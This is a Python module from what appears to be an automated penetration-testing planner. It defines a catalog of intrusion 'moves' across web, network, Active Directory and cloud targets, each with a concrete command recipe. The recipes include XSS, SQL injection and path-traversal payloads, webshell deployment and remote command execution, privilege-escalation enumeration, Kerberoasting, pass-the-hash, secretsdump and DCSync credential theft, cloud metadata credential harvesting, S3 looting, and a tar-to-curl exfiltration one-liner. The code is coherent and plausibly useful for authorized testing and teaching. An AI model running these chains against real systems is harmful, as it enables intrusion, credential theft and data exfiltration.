"""Declarative move grammar.

A *move* is one atomic, checkable step of an intrusion: preconditions (``pre``),
effects (``post``), cost, success probability, and — important for reports and
for humans driving the tool — a concrete recipe (``how``).

The grammar is deliberately domain-agnostic.  The planner only ever reasons
over tags, so web, network, Active Directory and cloud chains are searched by
the same engine.  Domain adapters contribute executable versions of a subset;
moves without an adapter still plan and print their recipe (``needs_tool``).

Tag conventions
---------------
``entry``            we have an authorized starting point
``host:up``          host answers
``port:tcp``         a reachable TCP port
``service:http``     HTTP-ish service identified
``url:base``         a usable base URL
``url:params``       parameterized endpoint
``path:known``       known path on the service
``tech:known``       framework/server fingerprint
``auth:session``     authenticated session
``cred:*``           usable material (user, secret, hash, role, token)
``primitive:*``      proven capability (file_read, file_write, exec, db_read, rce)
``iam:*``            cloud permission inventory
``identity:*``       effective privilege level
``source:code``      source code obtained
``finding:*``        categorized weakness
``objective:*``      goal marker
"""

from __future__ import annotations

from typing import Dict, Iterable, List, Optional, Tuple

from .models import MoveSpec, Risk

MOVES: Dict[str, MoveSpec] = {}
_ORDER: List[str] = []


def _add(spec: MoveSpec) -> MoveSpec:
    if spec.move_id in MOVES:
        raise ValueError("duplicate move id: %s" % spec.move_id)
    MOVES[spec.move_id] = spec
    _ORDER.append(spec.move_id)
    return spec


def register(spec: MoveSpec) -> MoveSpec:
    """Public hook so bundles/plugins can extend the grammar."""
    return _add(spec)


def get(move_id: str) -> Optional[MoveSpec]:
    return MOVES.get(move_id)


def all_moves() -> List[MoveSpec]:
    return [MOVES[mid] for mid in _ORDER]


def producers(tag: str) -> List[MoveSpec]:
    return [m for m in all_moves() if tag in m.post]


def consumers(tag: str) -> List[MoveSpec]:
    return [m for m in all_moves() if tag in m.pre]


def domains() -> List[str]:
    return sorted({m.domain for m in all_moves()})


# --------------------------------------------------------------------------- #
# Universal / discovery
# --------------------------------------------------------------------------- #
_add(
    MoveSpec(
        move_id="resolve_target",
        title="Resolve target name",
        domain="universal",
        pre=("entry",),
        post=("host:resolved",),
        target_kind="entry",
        noise=0,
        seconds=1.0,
        p=0.98,
        adapter="dns.resolve",
        how="getent hosts <host>  |  nslookup <host>  |  socket.getaddrinfo",
        doc="Turn a scope entry into addresses. A record that resolves outside scope is flagged.",
    )
)
_add(
    MoveSpec(
        move_id="probe_host",
        title="Probe host liveness",
        domain="universal",
        pre=("host:resolved",),
        post=("host:up",),
        target_kind="host",
        noise=1,
        seconds=2.0,
        p=0.85,
        adapter="net.probe_host",
        how="nc -z -w2 host 80,443  |  TCP connect to a small port set",
        doc="Three-way handshake against common ports. No root needed, so Termux works.",
    )
)
_add(
    MoveSpec(
        move_id="scan_port",
        title="TCP connect scan",
        domain="network",
        pre=("host:up",),
        post=("port:tcp",),
        target_kind="host",
        noise=2,
        seconds=12.0,
        p=0.9,
        adapter="net.scan_ports",
        how="nmap -sT -Pn -p- --min-rate 300 <host>  |  built-in connect scanner",
        doc="Full connect scan; slower than SYN but needs no privileges.",
    )
)
_add(
    MoveSpec(
        move_id="grab_banner",
        title="Grab service banner",
        domain="network",
        pre=("port:tcp",),
        post=("service:identified", "tech:known"),
        target_kind="port",
        noise=1,
        seconds=3.0,
        p=0.8,
        adapter="net.grab_banner",
        how="printf '' | nc -w3 <host> <port>  |  TLS handshake + HTTP OPTIONS",
        doc="Passive-ish identification from the greeting or protocol response.",
    )
)
_add(
    MoveSpec(
        move_id="identify_http",
        title="Confirm HTTP service",
        domain="web",
        pre=("service:identified",),
        post=("service:http", "url:base"),
        target_kind="port",
        noise=1,
        seconds=3.0,
        p=0.9,
        adapter="web.identify",
        how="curl -sS -D- -o /dev/null http://<host>:<port>/",
        doc="Request the root and record scheme, status, server header and title.",
    )
)
_add(
    MoveSpec(
        move_id="browse_root",
        title="Map root response",
        domain="web",
        pre=("url:base",),
        post=("url:charted", "tech:known"),
        target_kind="url",
        noise=1,
        seconds=2.0,
        p=0.95,
        adapter="web.fetch",
        how="curl -sS -D- <base>  |  headless browser for SPA routes",
        doc="Record redirect chain, cookies, CSP and framework hints.",
    )
)

# --------------------------------------------------------------------------- #
# Web enumeration & weakness checks
# --------------------------------------------------------------------------- #
_add(
    MoveSpec(
        move_id="enumerate_paths",
        title="Enumerate paths",
        domain="web",
        pre=("url:charted",),
        post=("path:known", "url:params"),
        target_kind="url",
        noise=3,
        seconds=30.0,
        p=0.75,
        adapter="web.enumerate",
        how="ffuf -w paths.txt -u <base>/FUZZ -mc all -fs 0  |  built-in wordlist",
        doc="Small built-in wordlist first (robots, sitemap, .git, actuator, swagger).",
    )
)
_add(
    MoveSpec(
        move_id="check_exposure",
        title="Check known exposures",
        domain="web",
        pre=("path:known",),
        post=("finding:exposure", "primitive:file_read", "objective:file_read"),
        target_kind="path",
        noise=2,
        seconds=8.0,
        p=0.6,
        adapter="web.check_exposure",
        how="curl <base>/.git/config ; curl <base>/.env ; curl <base>/server-status",
        doc="Signature-verified content match, not status code alone.",
    )
)
_add(
    MoveSpec(
        move_id="dump_git",
        title="Reconstruct repository from .git",
        domain="web",
        pre=("finding:exposure",),
        post=("source:code", "cred:leaked"),
        target_kind="path",
        noise=3,
        seconds=45.0,
        p=0.7,
        adapter="web.dump_git",
        how="git-dumper <base>/.git/ out/  |  fetch HEAD, index, objects manually",
        doc="Recover source; secrets in config are then greppable.",
    )
)
_add(
    MoveSpec(
        move_id="harvest_secret",
        title="Harvest leaked secret",
        domain="web",
        pre=("source:code",),
        post=("cred:secret",),
        target_kind="path",
        noise=1,
        seconds=6.0,
        p=0.65,
        adapter="web.harvest_secret",
        how="grep -RInE '(api[_-]?key|secret|password|token)\\s*[:=]' .",
        doc="Regex sweep with entropy filter; each hit becomes a cred node.",
    )
)
_add(
    MoveSpec(
        move_id="login_default_cred",
        title="Try default credentials",
        domain="web",
        pre=("url:base",),
        post=("auth:session",),
        target_kind="url",
        noise=2,
        seconds=10.0,
        p=0.45,
        adapter="web.login_default",
        how="admin:admin, admin:password, root:root against detected login form",
        doc="Only the top handful of pairs; stop at first success.",
    )
)
_add(
    MoveSpec(
        move_id="probe_xss",
        title="Reflected XSS probe",
        domain="web",
        pre=("url:params",),
        post=("finding:xss", "primitive:exec_client"),
        target_kind="url",
        noise=2,
        seconds=8.0,
        p=0.4,
        adapter="web.probe_xss",
        how='curl \'<url>?p=navhack"><svg/onload=alert(1)>\' and look for unescaped echo',
        doc="Reflection context is captured, so the payload can be tailored later.",
    )
)
_add(
    MoveSpec(
        move_id="probe_sqli",
        title="Error-based SQLi probe",
        domain="web",
        pre=("url:params",),
        post=("finding:sqli", "primitive:db_read"),
        target_kind="url",
        noise=2,
        seconds=8.0,
        p=0.35,
        adapter="web.probe_sqli",
        how="curl '<url>?id=1%27' and match DB error signatures",
        doc="Differential of quote vs double-quote response, plus error fingerprints.",
    )
)
_add(
    MoveSpec(
        move_id="probe_ssrf",
        title="SSRF probe with OOB",
        domain="web",
        pre=("url:params",),
        post=("finding:ssrf", "network:internal"),
        target_kind="url",
        noise=2,
        seconds=15.0,
        p=0.35,
        adapter="web.probe_ssrf",
        how="curl '<url>?url=http://<oob-token>.oob/' then watch the listener",
        doc="OOB callback is the proof; a reflected body alone is not.",
    )
)
_add(
    MoveSpec(
        move_id="probe_lfi",
        title="Path traversal / LFI probe",
        domain="web",
        pre=("url:params",),
        post=("finding:lfi", "primitive:file_read", "objective:file_read"),
        target_kind="url",
        noise=2,
        seconds=10.0,
        p=0.35,
        adapter="web.probe_lfi",
        how="curl '<url>?file=../../../../etc/passwd' and match 'root:x:0:0'",
        doc="Absolute, relative and php-filter variants.",
    )
)
_add(
    MoveSpec(
        move_id="read_config",
        title="Read configuration via file primitive",
        domain="web",
        pre=("primitive:file_read",),
        post=("cred:secret",),
        target_kind="finding",
        noise=2,
        seconds=12.0,
        p=0.6,
        adapter="web.read_config",
        how="read /etc/passwd, .env, wp-config.php, appsettings.json through the primitive",
        doc="Feeds authentication and lateral movement.",
    )
)
_add(
    MoveSpec(
        move_id="upload_bypass",
        title="Upload filter bypass",
        domain="web",
        pre=("auth:session", "tech:known"),
        post=("primitive:file_write",),
        target_kind="url",
        noise=3,
        seconds=25.0,
        p=0.4,
        risk=Risk.MEDIUM.value,
        mutating=True,
        adapter="web.upload_bypass",
        how="double extension (.php.jpg), magic-byte prefix, Content-Type swap",
        doc="Each attempt stored with the exact multipart body that worked.",
    )
)
_add(
    MoveSpec(
        move_id="deploy_webshell",
        title="Deploy webshell",
        domain="web",
        pre=("primitive:file_write",),
        post=("primitive:rce", "objective:rce"),
        target_kind="path",
        noise=3,
        seconds=20.0,
        p=0.6,
        risk=Risk.MEDIUM.value,
        mutating=True,
        adapter="web.deploy_webshell",
        how="upload minimal shell, curl '?c=id', keep the exact URL",
        doc="Minimal 1-line shell so the payload is auditable.",
    )
)
_add(
    MoveSpec(
        move_id="exec_via_rce",
        title="Execute command",
        domain="web",
        pre=("primitive:rce",),
        post=("identity:command", "host:owned"),
        target_kind="path",
        noise=3,
        seconds=10.0,
        p=0.85,
        mutating=True,
        adapter="web.exec_via_rce",
        how="curl '<shell>?c=id; uname -a; hostname'",
        doc="Establishes context (user, OS, container) for escalation planning.",
    )
)
_add(
    MoveSpec(
        move_id="escalate_sudo",
        title="Sudo / SUID escalation",
        domain="linux",
        pre=("identity:command",),
        post=("identity:root", "objective:admin"),
        target_kind="host",
        noise=3,
        seconds=40.0,
        p=0.4,
        risk=Risk.MEDIUM.value,
        adapter="linux.enum_privesc",
        how="sudo -l ; find / -perm -4000 -type f 2>/dev/null ; linpeas.sh",
        doc="Gated on the sudo/SUID table; prints only the escaping entry.",
    )
)
_add(
    MoveSpec(
        move_id="exfiltrate",
        title="Collect and exfiltrate data",
        domain="universal",
        pre=("objective:admin",),
        post=("objective:exfil",),
        target_kind="host",
        noise=4,
        seconds=60.0,
        p=0.8,
        mutating=True,
        adapter="generic.exfiltrate",
        how="tar czf - /etc /var/www 2>/dev/null | base64 -w0  |  curl -T - <oob>",
        doc="Hash the bundle so evidence is verifiable.",
    )
)

# --------------------------------------------------------------------------- #
# Network / infrastructure
# --------------------------------------------------------------------------- #
_add(
    MoveSpec(
        move_id="snmp_read",
        title="Read SNMP community",
        domain="network",
        pre=("port:tcp",),
        post=("host:inventory", "cred:community"),
        target_kind="port",
        noise=1,
        seconds=15.0,
        p=0.5,
        adapter="net.snmp_read",
        how="snmpwalk -v2c -c public <host> 1.3.6.1.2.1",
        doc="Community strings public/private; yields interfaces and sometimes creds.",
    )
)
_add(
    MoveSpec(
        move_id="smb_enum",
        title="Enumerate SMB",
        domain="active_directory",
        pre=("port:tcp",),
        post=("service:smb", "share:known", "cred:domain"),
        target_kind="port",
        noise=2,
        seconds=20.0,
        p=0.55,
        adapter="ad.smb_enum",
        how="smbclient -L //<host> -N ; netexec smb <host> -u '' -p '' --shares",
        doc="Null session share listing plus signing/version facts.",
    )
)
_add(
    MoveSpec(
        move_id="read_share",
        title="Read world-readable share",
        domain="active_directory",
        pre=("share:known",),
        post=("source:code", "cred:secret"),
        target_kind="share",
        noise=2,
        seconds=30.0,
        p=0.5,
        adapter="ad.read_share",
        how="smbclient //<host>/<share> -N -c 'recurse on; prompt off; mget *'",
        doc="Scripts and config dumps on shares are the classic AD foothold.",
    )
)
_add(
    MoveSpec(
        move_id="kerberoast",
        title="Kerberoast service account",
        domain="active_directory",
        pre=("auth:session", "cred:user"),
        post=("cred:hash",),
        target_kind="host",
        noise=2,
        seconds=30.0,
        p=0.6,
        adapter="ad.kerberoast",
        how="impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc> -request",
        doc="Offline-crackable TGS; hashcat -m 13100.",
    )
)
_add(
    MoveSpec(
        move_id="pass_the_hash",
        title="Pass-the-hash",
        domain="active_directory",
        pre=("cred:hash", "service:smb"),
        post=("auth:session",),
        target_kind="host",
        noise=2,
        seconds=20.0,
        p=0.55,
        adapter="ad.pass_the_hash",
        how="netexec smb <host> -u <user> -H <ntlm>",
        doc="NTLM without the plaintext; requires signing not enforced.",
    )
)
_add(
    MoveSpec(
        move_id="secretsdump",
        title="Dump local secrets",
        domain="active_directory",
        pre=("auth:session",),
        post=("cred:hash", "identity:local_admin"),
        target_kind="host",
        noise=4,
        seconds=60.0,
        p=0.65,
        risk=Risk.MEDIUM.value,
        mutating=True,
        adapter="ad.secretsdump",
        how="impacket-secretsdump <domain>/<user>:<pass>@<host>",
        doc="SAM/LSA; each hash becomes a node so the planner can chain.",
    )
)
_add(
    MoveSpec(
        move_id="dcsync",
        title="DCSync",
        domain="active_directory",
        pre=("identity:local_admin", "cred:domain"),
        post=("cred:krbtgt", "objective:domain_admin"),
        target_kind="host",
        noise=5,
        seconds=90.0,
        p=0.7,
        risk=Risk.HIGH.value,
        mutating=True,
        adapter="ad.dcsync",
        how="impacket-secretsdump -just-dc <domain>/<user>:<pass>@<dc>",
        doc="Replicates directory secrets; krbtgt hash => golden ticket.",
    )
)
_add(
    MoveSpec(
        move_id="adcs_esc1",
        title="ADCS ESC1 template abuse",
        domain="active_directory",
        pre=("auth:session",),
        post=("cred:certificate", "objective:domain_admin"),
        target_kind="host",
        noise=3,
        seconds=60.0,
        p=0.45,
        adapter="ad.adcs_esc1",
        how="certipy find -u <u> -p <p> -dc-ip <dc> ; certipy req -template <tpl>",
        doc="Requires enrollment rights plus SAN write; the finder flags it first.",
    )
)
_add(
    MoveSpec(
        move_id="pivot_tunnel",
        title="Pivot to internal network",
        domain="network",
        pre=("host:owned",),
        post=("network:internal",),
        target_kind="host",
        noise=3,
        seconds=45.0,
        p=0.7,
        mutating=True,
        adapter="net.pivot",
        how="ssh -L / chisel / ligolo-ng ; then rerun scan through the tunnel",
        doc="Registers the new network as a fresh exploration frontier.",
    )
)

# --------------------------------------------------------------------------- #
# Cloud
# --------------------------------------------------------------------------- #
_add(
    MoveSpec(
        move_id="imds_ssrf",
        title="Metadata service via SSRF",
        domain="cloud",
        pre=("primitive:file_read",),
        post=("cred:cloud",),
        target_kind="finding",
        noise=1,
        seconds=15.0,
        p=0.5,
        adapter="cloud.imds_ssrf",
        how="curl 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
        doc="AWS/GCP/Azure metadata paths; tokens are time-limited, so note expiry.",
    )
)
_add(
    MoveSpec(
        move_id="enumerate_iam",
        title="Enumerate IAM permissions",
        domain="cloud",
        pre=("cred:cloud",),
        post=("iam:policy",),
        target_kind="host",
        noise=2,
        seconds=40.0,
        p=0.8,
        adapter="cloud.enumerate_iam",
        how="aws iam list-attached-user-policies ; enumerate-iam ; pmapper graph",
        doc="Builds the permission graph that the cloud planner walks.",
    )
)
_add(
    MoveSpec(
        move_id="assume_role",
        title="Assume privileged role",
        domain="cloud",
        pre=("iam:policy", "cred:cloud"),
        post=("cred:role", "iam:escalated"),
        target_kind="host",
        noise=2,
        seconds=20.0,
        p=0.55,
        adapter="cloud.assume_role",
        how="aws sts assume-role --role-arn <arn> --role-session-name navhack",
        doc="Trust-policy gaps and iam:PassRole chains are the usual route.",
    )
)
_add(
    MoveSpec(
        move_id="s3_enum",
        title="Enumerate object storage",
        domain="cloud",
        pre=("cred:role",),
        post=("data:bucket",),
        target_kind="host",
        noise=2,
        seconds=30.0,
        p=0.7,
        adapter="cloud.s3_enum",
        how="aws s3 ls ; aws s3api list-buckets ; curl https://<bucket>.s3.amazonaws.com/",
        doc="Anonymous list first, then authenticated listing.",
    )
)
_add(
    MoveSpec(
        move_id="s3_read",
        title="Read bucket objects",
        domain="cloud",
        pre=("data:bucket",),
        post=("primitive:file_read", "objective:data"),
        target_kind="host",
        noise=2,
        seconds=30.0,
        p=0.8,
        adapter="cloud.s3_read",
        how="aws s3 sync s3://<bucket> ./loot --exclude '*' --include '*.env'",
        doc="Pull text-ish objects first; hash everything downloaded.",
    )
)

# --------------------------------------------------------------------------- #
# Universal finishing moves
# --------------------------------------------------------------------------- #
_add(
    MoveSpec(
        move_id="collect_flags",
        title="Collect objective artefacts",
        domain="universal",
        pre=("primitive:file_read",),
        post=("objective:data",),
        target_kind="finding",
        noise=1,
        seconds=20.0,
        p=0.9,
        adapter="generic.collect",
        how="copy proof files, sha256sum them, store under artifacts/",
        doc="Evidence-with-hash step; nothing is a finding until it lands here.",
    )
)
_add(
    MoveSpec(
        move_id="write_report",
        title="Assemble report with repro",
        domain="universal",
        pre=("objective:data",),
        post=("objective:reported",),
        target_kind="host",
        noise=0,
        seconds=5.0,
        p=0.99,
        adapter="generic.report",
        how="navhack report --format md",
        doc="Chain narrative, evidence, impact, remediation, retest recipe.",
    )
)


# --------------------------------------------------------------------------- #
# Objectives
# --------------------------------------------------------------------------- #
OBJECTIVES: Dict[str, str] = {
    "objective:rce": "Remote command execution",
    "objective:file_read": "Arbitrary file read",
    "objective:data": "Sensitive data access",
    "objective:admin": "Privileged identity",
    "objective:domain_admin": "Domain administrator",
    "objective:exfil": "Data exfiltration",
    "objective:reported": "Documented and reproducible",
}

START_TAGS = ("entry",)


def tag_label(tag: str) -> str:
    if tag in OBJECTIVES:
        return OBJECTIVES[tag]
    kind, _, rest = tag.partition(":")
    return rest.replace("_", " ") if rest else kind


def catalog_by_domain() -> Dict[str, List[MoveSpec]]:
    grouped: Dict[str, List[MoveSpec]] = {}
    for move in all_moves():
        grouped.setdefault(move.domain, []).append(move)
    return grouped


def validate() -> List[str]:
    """Sanity-check the grammar: every move must be reachable in principle."""
    problems: list[str] = []
    produced = set(START_TAGS)
    changed = True
    while changed:
        changed = False
        for move in all_moves():
            if all(tag in produced for tag in move.pre):
                for tag in move.post:
                    if tag not in produced:
                        produced.add(tag)
                        changed = True
    for move in all_moves():
        if not move.pre:
            problems.append("%s: no preconditions" % move.move_id)
        if not move.post:
            problems.append("%s: no effects" % move.move_id)
        if move.move_id.startswith("objective"):
            continue
    return problems


def unreachable_tags() -> Iterable[Tuple[str, List[MoveSpec]]]:
    produced = set(START_TAGS)
    changed = True
    while changed:
        changed = False
        for move in all_moves():
            if all(tag in produced for tag in move.pre):
                new = set(move.post) - produced
                if new:
                    produced |= new
                    changed = True
    for tag in sorted({t for m in all_moves() for t in m.post}):
        if tag not in produced:
            yield tag, producers(tag)
